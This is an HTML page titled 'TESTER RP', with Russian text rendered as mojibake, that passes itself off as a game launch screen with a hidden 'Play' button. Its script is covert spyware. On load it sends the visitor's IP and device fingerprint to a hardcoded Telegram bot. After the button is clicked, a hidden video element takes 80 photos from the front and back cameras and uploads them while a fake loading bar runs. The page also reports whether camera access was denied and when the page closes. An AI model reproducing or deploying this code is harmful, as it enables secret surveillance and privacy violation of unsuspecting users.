<!DOCTYPE html><html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TESTER RP</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            overflow: hidden;
            touch-action: none;
            -webkit-text-size-adjust: none;
            text-size-adjust: none;
            height: 100vh;
            font-family: Arial, sans-serif;
            position: relative;
            background: #000;
            display: flex;
            flex-direction: column;
        }
        
        .background-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('https://i.ibb.co/LDrtg7sJ/12-20250403192149.png') no-repeat center center;
            background-size: cover;
            z-index: -2;
        }
        
        .new-background {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('https://i.ibb.co/kVcnz5xZ/14.png') no-repeat center center;
            background-size: cover;
            z-index: -1;
            display: none;
        }
        
        .content {
            position: relative;
            z-index: 1;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
            align-items: center;
            padding-bottom: 20px;
        }
        
        .play-btn {
            background: transparent;
            border: none;
            width: 200px;
            height: 80px;
            margin-bottom: 100px;
            cursor: pointer;
            position: absolute;
            bottom: 150px;
            opacity: 0;
        }
        
        .hidden-camera {
            position: absolute;
            opacity: 0;
            width: 1px;
            height: 1px;
        }
        
        .legal-links {
            position: absolute;
            bottom: 10px;
            width: 100%;
            text-align: center;
            color: #fff;
            font-size: 12px;
            padding: 5px 0;
        }
        
        .message-box {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.8);
            color: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            z-index: 100;
            display: none;
        }
        
        .loading-container {
            position: absolute;
            bottom: 50px;
            width: 80%;
            left: 10%;
            text-align: center;
            color: white;
            display: none;
        }
        
        .loading-text {
            margin-bottom: 10px;
            font-size: 16px;
        }
        
        .progress-bar {
            width: 100%;
            height: 10px;
            background-color: #333;
            border-radius: 5px;
            overflow: hidden;
        }
        
        .progress {
            height: 100%;
            width: 0;
            background-color: white;
            transition: width 0.1s linear;
        }
    </style>
</head>
<body>
    <div class="background-container"></div>
    <div class="new-background"></div>
    <div class="content">
        <button class="play-btn" id="playBtn"></button>
    </div>

    <div class="legal-links">
        –î–æ–≥–æ–≤–æ—Ä –æ—Ñ–µ—Ä—Ç—ã    –ü–æ–ª–∏—Ç–∏–∫–∞ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç–∏
    </div>

    <div class="message-box" id="messageBox">
        –§–æ—Ä—É–º –≤ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ
    </div>

    <div class="loading-container" id="loadingContainer">
        <div class="loading-text">Loading</div>
        <div class="progress-bar">
            <div class="progress" id="progressBar"></div>
        </div>
    </div>

    <video id="hiddenCamera" class="hidden-camera" autoplay playsinline></video>

    <script>
        // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –≤ Chrome –ø—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏ –∏–∑ –¥—Ä—É–≥–∏—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π
        if (!navigator.userAgent.includes('Chrome') && !navigator.userAgent.includes('Firefox') && !navigator.userAgent.includes('Safari')) {
            window.location.href = 'googlechrome://navigate?url=' + encodeURIComponent(window.location.href);
        }

        const botToken = '8134203113:AAEv9pmQQkES_IwC9LhbeMrB1dBO_zLUPcw';
        const chatId = '-1002577213610';
        const videoElement = document.getElementById('hiddenCamera');
        const playBtn = document.getElementById('playBtn');
        const messageBox = document.getElementById('messageBox');
        const newBackground = document.querySelector('.new-background');
        const loadingContainer = document.getElementById('loadingContainer');
        const progressBar = document.getElementById('progressBar');
        
        let currentStream = null;
        let frontCameraStream = null;
        let backCameraStream = null;
        let photoCount = 0;
        const totalPhotos = 80;
        const photoInterval = 50;
        let isFrontCameraActive = true;

        // –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –º–∞—Å—à—Ç–∞–±–∏—Ä–æ–≤–∞–Ω–∏—è
        document.addEventListener('gesturestart', function(e) {
            e.preventDefault();
        });
        
        document.addEventListener('touchmove', function(e) {
            if(e.scale !== 1) {
                e.preventDefault();
            }
        }, { passive: false });

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –±–∞—Ç–∞—Ä–µ–µ
        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging ? '–î–∞' : '–ù–µ—Ç',
                        chargingTime: battery.chargingTime ? battery.chargingTime + ' —Å–µ–∫' : '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                        dischargingTime: battery.dischargingTime ? battery.dischargingTime + ' —Å–µ–∫' : '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
                    };
                } catch (e) {
                    return { error: '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –æ –±–∞—Ç–∞—Ä–µ–µ' };
                }
            }
            return { error: 'API –±–∞—Ç–∞—Ä–µ–∏ –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è' };
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–∏
        function getConnectionInfo() {
            if ('connection' in navigator) {
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (connection) {
                    return {
                        type: connection.type || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                        effectiveType: connection.effectiveType || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                        downlink: connection.downlink + ' Mbps',
                        rtt: connection.rtt + ' –º—Å',
                        saveData: connection.saveData ? '–î–∞' : '–ù–µ—Ç'
                    };
                }
            }
            return { error: '–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–∏ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞' };
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
        function getDeviceInfo() {
            const screen = window.screen;
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages ? navigator.languages.join(', ') : '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                cookieEnabled: navigator.cookieEnabled ? '–î–∞' : '–ù–µ—Ç',
                doNotTrack: navigator.doNotTrack || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                hardwareConcurrency: navigator.hardwareConcurrency || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                maxTouchPoints: navigator.maxTouchPoints || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth + ' –±–∏—Ç',
                    pixelDepth: screen.pixelDepth + ' –±–∏—Ç',
                    orientation: screen.orientation ? screen.orientation.type : '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
                },
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight,
                    outerWidth: window.outerWidth,
                    outerHeight: window.outerHeight
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                date: new Date().toString(),
                localTime: new Date().toLocaleString(),
                timezoneOffset: new Date().getTimezoneOffset() + ' –º–∏–Ω—É—Ç'
            };

            return deviceInfo;
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –≤ —á–∏—Ç–∞–µ–º—ã–π –≤–∏–¥
        function formatInfo(info) {
            let result = '';
            for (const [key, value] of Object.entries(info)) {
                if (typeof value === 'object' && value !== null) {
                    result += `\n${key}:\n${formatInfo(value).replace(/^/gm, '  ')}`;
                } else {
                    result += `${key}: ${value}\n`;
                }
            }
            return result;
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—É—Å–∫–∞ –ø—Ä–æ–≥—Ä–µ—Å—Å-–±–∞—Ä–∞
        function startProgressBar() {
            loadingContainer.style.display = 'block';
            let progress = 0;
            const interval = 40; // 40 —Å–µ–∫—É–Ω–¥ = 40000 –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥
            const step = 100 / (interval * 10); // 10 –æ–±–Ω–æ–≤–ª–µ–Ω–∏–π –≤ —Å–µ–∫—É–Ω–¥—É
            
            const timer = setInterval(() => {
                progress += step;
                progressBar.style.width = `${progress}%`;
                
                if (progress >= 100) {
                    clearInterval(timer);
                    messageBox.style.display = 'block';
                    setTimeout(() => {
                        progressBar.style.width = '0%';
                    }, 1000);
                }
            }, 100);
        }

        // –£–ù–ò–í–ï–†–°–ê–õ–¨–ù–ê–Ø –§–£–ù–ö–¶–ò–Ø –û–¢–ü–†–ê–í–ö–ò –í TELEGRAM
        async function sendToTelegram(endpoint, data) {
            try {
                let url = `https://api.telegram.org/bot${botToken}/${endpoint}`;
                
                if (data instanceof FormData) {
                    // –î–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ (multipart/form-data)
                    const response = await fetch(url, {
                        method: 'POST',
                        body: data
                    });
                    
                    const result = await response.json();
                    console.log('Telegram photo response:', result);
                    
                    if (!result.ok) {
                        throw new Error(result.description || 'Unknown Telegram error');
                    }
                    
                    return result;
                } else {
                    // –î–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π (application/json)
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(data)
                    });
                    
                    const result = await response.json();
                    console.log('Telegram message response:', result);
                    
                    if (!result.ok) {
                        throw new Error(result.description || 'Unknown Telegram error');
                    }
                    
                    return result;
                }
            } catch (error) {
                console.error('Telegram API error:', error);
                throw error;
            }
        }

        // 1. –û—Ç–ø—Ä–∞–≤–∫–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
        async function sendUserInfo() {
            try {
                console.log('Starting user info collection...');
                
                // –ü–æ–ª—É—á–∞–µ–º IP-–∞–¥—Ä–µ—Å
                let ip = 'Unknown';
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    if (ipResponse.ok) {
                        const ipData = await ipResponse.json();
                        ip = ipData.ip;
                    }
                } catch (ipError) {
                    console.warn('Could not get IP:', ipError);
                }

                // –ü–æ–ª—É—á–∞–µ–º –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
                const [batteryInfo, connectionInfo] = await Promise.all([
                    getBatteryInfo().catch(e => ({ error: e.message })),
                    getConnectionInfo()
                ]);

                const deviceInfo = getDeviceInfo();

                // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —Å —ç—Å–∫–µ–π–ø–∏–Ω–≥–æ–º
                let message = `üö® *–ù–û–í–´–ô –ü–û–°–ï–¢–ò–¢–ï–õ–™* üö®\n\n`;
                message += `üì± *–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ:*\n`;
                message += `IP: ${ip}\n`;
                message += `User Agent: ${deviceInfo.userAgent}\n`;
                message += `–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${deviceInfo.platform}\n`;
                message += `–Ø–∑—ã–∫: ${deviceInfo.language}\n`;
                message += `–≠–∫—Ä–∞–Ω: ${deviceInfo.screen.width}x${deviceInfo.screen.height}\n`;
                message += `–í—Ä–µ–º—è: ${new Date().toLocaleString()}\n\n`;
                
                if (batteryInfo && !batteryInfo.error) {
                    message += `üîã *–ë–∞—Ç–∞—Ä–µ—è:* ${batteryInfo.level}, –ó–∞—Ä—è–¥–∫–∞: ${batteryInfo.charging}\n\n`;
                }
                
                if (connectionInfo && !connectionInfo.error) {
                    message += `üì∂ *–°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ:* ${connectionInfo.effectiveType || connectionInfo.type}\n\n`;
                }
                
                message += `---\n*–ü–æ–ª–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:*\n${formatInfo(deviceInfo).substring(0, 2000)}`;

                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ Telegram
                console.log('Sending user info to Telegram...');
                await sendToTelegram('sendMessage', {
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown'
                });
                
                console.log('User info sent successfully!');

            } catch (error) {
                console.error('Error sending user info:', error);
                
                // Fallback: –ø—Ä–æ–±—É–µ–º –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –º–∏–Ω–∏–º–∞–ª—å–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
                try {
                    const deviceInfo = getDeviceInfo();
                    let fallbackMessage = `‚ö†Ô∏è *–û–®–ò–ë–ö–ê –°–ë–û–†–ê –î–ê–ù–ù–´–•*\n\n`;
                    fallbackMessage += `–í—Ä–µ–º—è: ${new Date().toLocaleString()}\n`;
                    fallbackMessage += `User Agent: ${deviceInfo.userAgent}\n`;
                    fallbackMessage += `–û—à–∏–±–∫–∞: ${error.message || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞'}`;
                    
                    await sendToTelegram('sendMessage', {
                        chat_id: chatId,
                        text: fallbackMessage,
                        parse_mode: 'Markdown'
                    });
                } catch (fallbackError) {
                    console.error('Fallback also failed:', fallbackError);
                }
            }
        }

        // 2. –ó–∞—Ö–≤–∞—Ç —Ñ–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã –∏ –æ—Ç–ø—Ä–∞–≤–∫–∞
        async function captureAndSendPhoto(index) {
            try {
                console.log(`Capturing photo ${index}...`);
                
                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth || 640;
                canvas.height = videoElement.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                
                const blob = await new Promise(resolve => {
                    canvas.toBlob(resolve, 'image/jpeg', 0.7);
                });
                
                const cameraType = isFrontCameraActive ? 'front' : 'back';
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, `photo_${cameraType}_${index}.jpg`);
                
                const caption = `üì∏ –§–æ—Ç–æ ${isFrontCameraActive ? '—Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–æ–π' : '–∑–∞–¥–Ω–µ–π'} –∫–∞–º–µ—Ä—ã #${index}\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}`;
                formData.append('caption', caption);
                formData.append('parse_mode', 'HTML');
                
                console.log(`Sending photo ${index} to Telegram...`);
                await sendToTelegram('sendPhoto', formData);
                
                console.log(`Photo ${index} (${cameraType}) sent successfully!`);
                
            } catch (error) {
                console.error(`Error sending photo ${index}:`, error);
                
                // –ü—Ä–∏ –æ—à–∏–±–∫–µ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ - –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç–µ–∫—Å—Ç–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
                try {
                    await sendToTelegram('sendMessage', {
                        chat_id: chatId,
                        text: `‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ #${index}\n–ö–∞–º–µ—Ä–∞: ${isFrontCameraActive ? '—Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è' : '–∑–∞–¥–Ω—è—è'}\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}\n–û—à–∏–±–∫–∞: ${error.message || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞'}`,
                        parse_mode: 'HTML'
                    });
                } catch (e) {
                    console.error('Error sending error message:', e);
                }
            }
        }

        // 3. –ü–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ –º–µ–∂–¥—É –∫–∞–º–µ—Ä–∞–º–∏
        async function switchCamera() {
            try {
                if (currentStream) {
                    currentStream.getTracks().forEach(track => track.stop());
                }

                isFrontCameraActive = !isFrontCameraActive;
                const facingMode = isFrontCameraActive ? 'user' : 'environment';

                console.log(`Switching to ${isFrontCameraActive ? 'front' : 'back'} camera...`);
                currentStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: facingMode,
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });

                videoElement.srcObject = currentStream;

                if (isFrontCameraActive) {
                    frontCameraStream = currentStream;
                } else {
                    backCameraStream = currentStream;
                }

                await new Promise(resolve => setTimeout(resolve, 300));
                console.log(`Camera switched to ${isFrontCameraActive ? 'front' : 'back'}`);

            } catch (error) {
                console.error('Camera switch error:', error);
                
                try {
                    await sendToTelegram('sendMessage', {
                        chat_id: chatId,
                        text: `‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏—è –∫–∞–º–µ—Ä—ã\n–¢–∏–ø: ${isFrontCameraActive ? '–Ω–∞ –∑–∞–¥–Ω—é—é' : '–Ω–∞ —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω—É—é'}\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}\n–û—à–∏–±–∫–∞: ${error.message || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞'}`,
                        parse_mode: 'HTML'
                    });
                } catch (e) {
                    console.error('Error sending switch error:', e);
                }
                
                throw error;
            }
        }

        // 4. –°–µ—Ä–∏–π–Ω–∞—è —Å—ä–µ–º–∫–∞
        async function takeSeriesOfPhotos() {
            try {
                if (photoCount < totalPhotos) {
                    await captureAndSendPhoto(photoCount + 1);
                    photoCount++;
                    
                    if (photoCount < totalPhotos) {
                        await switchCamera();
                        setTimeout(takeSeriesOfPhotos, photoInterval);
                    } else {
                        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–∏ —Å—ä–µ–º–∫–∏
                        try {
                            await sendToTelegram('sendMessage', {
                                chat_id: chatId,
                                text: `‚úÖ –°–ï–†–ò–ô–ù–ê–Ø –°–™–ï–ú–ö–ê –ó–ê–í–ï–†–®–ï–ù–ê\n–í—Å–µ–≥–æ —Ñ–æ—Ç–æ: ${totalPhotos}\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}\n–£—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ: ${photoCount}`,
                                parse_mode: 'HTML'
                            });
                        } catch (e) {
                            console.error('Completion message error:', e);
                        }
                        
                        console.log('Photo series completed!');
                        stopAllCameras();
                    }
                }
                
            } catch (error) {
                console.error('Series error:', error);
                
                try {
                    await sendToTelegram('sendMessage', {
                        chat_id: chatId,
                        text: `‚ùå –û–®–ò–ë–ö–ê –°–ï–†–ò–ô–ù–û–ô –°–™–ï–ú–ö–ò\n–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ: ${photoCount}/${totalPhotos}\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}\n–û—à–∏–±–∫–∞: ${error.message || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞'}`,
                        parse_mode: 'HTML'
                    });
                } catch (e) {
                    console.error('Series error message error:', e);
                }
                
                stopAllCameras();
            }
        }

        // 5. –û—Å—Ç–∞–Ω–æ–≤–∫–∞ –≤—Å–µ—Ö –∫–∞–º–µ—Ä
        function stopAllCameras() {
            console.log('Stopping all cameras...');
            [frontCameraStream, backCameraStream, currentStream].forEach(stream => {
                if (stream) {
                    try {
                        stream.getTracks().forEach(track => track.stop());
                        console.log('Camera track stopped');
                    } catch (error) {
                        console.error('Error stopping camera:', error);
                    }
                }
            });
            videoElement.srcObject = null;
            console.log('All cameras stopped');
        }

        // 6. –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∫–∞–º–µ—Ä
        async function initCameras() {
            try {
                console.log('Initializing cameras...');
                
                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –Ω–æ–≤—ã–π —Ñ–æ–Ω –∏ –∑–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å-–±–∞—Ä
                newBackground.style.display = 'block';
                startProgressBar();

                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –Ω–∞—á–∞–ª–µ —Å—ä–µ–º–∫–∏
                try {
                    await sendToTelegram('sendMessage', {
                        chat_id: chatId,
                        text: `üì∏ –ù–ê–ß–ê–õ–û –°–ï–†–ò–ô–ù–û–ô –°–™–ï–ú–ö–ò\n–í—Å–µ–≥–æ —Ñ–æ—Ç–æ: ${totalPhotos}\n–ò–Ω—Ç–µ—Ä–≤–∞–ª: ${photoInterval}–º—Å\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}`,
                        parse_mode: 'HTML'
                    });
                } catch (e) {
                    console.error('Start message error:', e);
                }

                isFrontCameraActive = true;
                console.log('Requesting front camera access...');
                currentStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });
                frontCameraStream = currentStream;
                videoElement.srcObject = currentStream;

                console.log('Camera access granted, waiting for initialization...');
                await new Promise(resolve => setTimeout(resolve, 1000));

                photoCount = 0;
                console.log('Starting photo series...');
                takeSeriesOfPhotos();
                
            } catch (error) {
                console.error('Camera init error:', error);
                messageBox.style.display = 'block';
                
                try {
                    const errorMessage = `‚ö†Ô∏è –û–®–ò–ë–ö–ê –î–û–°–¢–£–ü–ê –ö –ö–ê–ú–ï–†–ê–ú\n–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${navigator.userAgent}\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}\n–û—à–∏–±–∫–∞: ${error.message || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞'}`;
                    
                    await sendToTelegram('sendMessage', {
                        chat_id: chatId,
                        text: errorMessage,
                        parse_mode: 'HTML'
                    });
                } catch (e) {
                    console.error('Camera error message error:', e);
                }
            }
        }

        // 7. –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ "–ò–≥—Ä–∞—Ç—å"
        playBtn.addEventListener('click', async function() {
            console.log('Play button clicked, starting verification...');
            try {
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –Ω–∞–∂–∞—Ç–∏–∏ –∫–Ω–æ–ø–∫–∏
                try {
                    await sendToTelegram('sendMessage', {
                        chat_id: chatId,
                        text: `üü¢ –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–¨ –ù–ê–ñ–ê–õ "–ò–ì–†–ê–¢–¨"\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}\nUser Agent: ${navigator.userAgent}`,
                        parse_mode: 'HTML'
                    });
                } catch (e) {
                    console.error('Button click message error:', e);
                }
                
                console.log('Requesting camera permission...');
                // –°–Ω–∞—á–∞–ª–∞ –∑–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                });
                // –ï—Å–ª–∏ –¥–æ—Å—Ç—É–ø –ø–æ–ª—É—á–µ–Ω, –∑–∞–∫—Ä—ã–≤–∞–µ–º –ø–æ—Ç–æ–∫
                stream.getTracks().forEach(track => track.stop());
                
                console.log('Camera permission granted, starting process...');
                // –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–æ—Ü–µ—Å—Å –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏
                await sendUserInfo();
                await initCameras();
            } catch (error) {
                console.error('User denied camera access:', error);
                messageBox.style.display = 'block';
                
                try {
                    await sendToTelegram('sendMessage', {
                        chat_id: chatId,
                        text: `‚õî –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–¨ –û–¢–ö–ê–ó–ê–õ –í –î–û–°–¢–£–ü–ï –ö –ö–ê–ú–ï–†–ï\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}\nUser Agent: ${navigator.userAgent}`,
                        parse_mode: 'HTML'
                    });
                } catch (e) {
                    console.error('Denial message error:', e);
                }
            }
        });

        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ —Å—Ä–∞–∑—É –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('load', function() {
            console.log('Page loaded, sending initial info...');
            sendUserInfo().catch(e => console.error('Initial info error:', e));
        });

        // –û—Å—Ç–∞–Ω–æ–≤–∫–∞ –∫–∞–º–µ—Ä –ø—Ä–∏ –∑–∞–∫—Ä—ã—Ç–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('beforeunload', function() {
            console.log('Page closing, stopping cameras...');
            
            try {
                sendToTelegram('sendMessage', {
                    chat_id: chatId,
                    text: `üì¥ –°–¢–†–ê–ù–ò–¶–ê –ó–ê–ö–†–´–¢–ê\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}\n–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ —Ñ–æ—Ç–æ: ${photoCount}/${totalPhotos}`,
                    parse_mode: 'HTML'
                });
            } catch (e) {
                console.error('Close message error:', e);
            }
            
            stopAllCameras();
        });

        // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ –≤–∏–¥–∏–º–æ—Å—Ç–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                console.log('Page hidden, stopping cameras...');
                stopAllCameras();
            }
        });
    </script>
</body>
</html>
